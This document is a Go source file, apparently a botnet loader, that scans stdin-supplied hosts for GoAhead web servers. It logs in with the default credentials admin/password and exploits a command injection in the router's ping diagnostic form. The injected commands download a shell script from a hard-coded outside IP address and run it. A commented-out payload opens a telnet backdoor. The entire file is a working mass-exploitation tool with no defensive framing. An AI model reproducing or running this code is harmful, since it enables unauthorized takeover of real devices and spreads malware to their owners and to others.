/*

ARM6

*/

package main

import (
    "net"
    "os"
    "time"
    "fmt"
    "strings"
    "sync"
    "bufio"
    "io"
    "bytes"
    "strconv"
)

var (
    port = os.Args[1]

    wg sync.WaitGroup

    timeout = 10 * time.Second

    processed uint64
    found uint64
    exploited uint64

    payloadScript = "http://144.172.73.12/wget.sh"
    scriptExec = "./wget.sh"
)

func findDevice(target string) bool {
    conn, err := net.DialTimeout("tcp", target, timeout)

    if err != nil {
        return false
    }

    defer conn.Close()

    conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

    var buff bytes.Buffer
    io.Copy(&buff, conn)

    return strings.Contains(buff.String(), "GoAhead-Webs")
}

func loginDevice(target string) string {
    conn, err := net.DialTimeout("tcp", target, timeout)

    if err != nil {
        return ""
    }

    defer conn.Close()

    data := "vlu_usrmg__preferred_lang_ui_type=gui&vlu_usrmg__preferred_lang_user_name=admin&user=admin&password=password"
    cntLen := strconv.Itoa(len(data))

    conn.Write([]byte("POST /goform/formAuthenticationLogin HTTP/1.1\r\nUser-Agent: Hello World\r\nHost: " + target + "\r\nConnection: keep-alive\r\nContent-Length: " + cntLen + "\r\n\r\n" + data))

    var buff bytes.Buffer
    io.Copy(&buff, conn)

    if strings.Contains(buff.String(), "document.cookie=") {
        // cookie = data.split('document.cookie="')[1].split(';path=/')[0]
        cookie := strings.Split(strings.Split(buff.String(), "document.cookie=\"")[1], ";path=/")[0]

        return cookie
    }

    return ""
}

func sendPayload(target, cookie, data string) {
    conn, err := net.DialTimeout("tcp", target, timeout)

    if err != nil {
        return
    }

    defer conn.Close()

    cntLen := strconv.Itoa(len(data))

    conn.Write([]byte("POST /goform/formSetDiagnosticToolsFmPing HTTP/1.1\r\nHost: " + target + "\r\nConnection: keep-alive\r\nContent-Length: " + cntLen + "\nCookie: " + cookie + "\r\n\r\n" + data))

    var buff bytes.Buffer
    io.Copy(&buff, conn)
}

func exploitDevice(target string) {

    processed++

    wg.Add(1)
    defer wg.Done()

    if !findDevice(target) {
        return
    }

    found++

    cookie := loginDevice(target)

    if cookie == "" {
        return
    }

    fmt.Printf("[SMC] logged in to %s with %s\n", target, cookie)

    /*
    telnetd  := "vlu_diagnostic_tools__ping_address=|/bin/telnetd&vlu_diagnostic_tools__ping_address=-p6969&vlu_diagnostic_tools__ping_count=4&vlu_diagnostic_tools__ping_packetsize=64&subUrl=network_diagnostic_tools.asp"
    sendPayload(target, cookie, telnetd)
    */

    wget := "vlu_diagnostic_tools__ping_address=|wget&vlu_diagnostic_tools__ping_address=" + payloadScript + " #&vlu_diagnostic_tools__ping_count=4&vlu_diagnostic_tools__ping_packetsize=64&subUrl=network_diagnostic_tools.asp"
    sendPayload(target, cookie, wget)

    rce  := "vlu_diagnostic_tools__ping_address=|/bin/sh&vlu_diagnostic_tools__ping_address=" + scriptExec + "&vlu_diagnostic_tools__ping_count=4&vlu_diagnostic_tools__ping_packetsize=64&subUrl=network_diagnostic_tools.asp"
    sendPayload(target, cookie, rce)
}

func titleWriter() {
    for {
        fmt.Printf("Processed: %d | Found: %d | Exploited: %d\n", processed, found, exploited)
        time.Sleep(1 * time.Second)
    }
}

func main() {

    scanner := bufio.NewScanner(os.Stdin)

    go titleWriter()

    for scanner.Scan() {

        if port == "manual" {
            go exploitDevice(scanner.Text())
        } else {
            go exploitDevice(scanner.Text() + ":" + port)
        }
    }

    time.Sleep(10 * time.Second)
    wg.Wait()
}
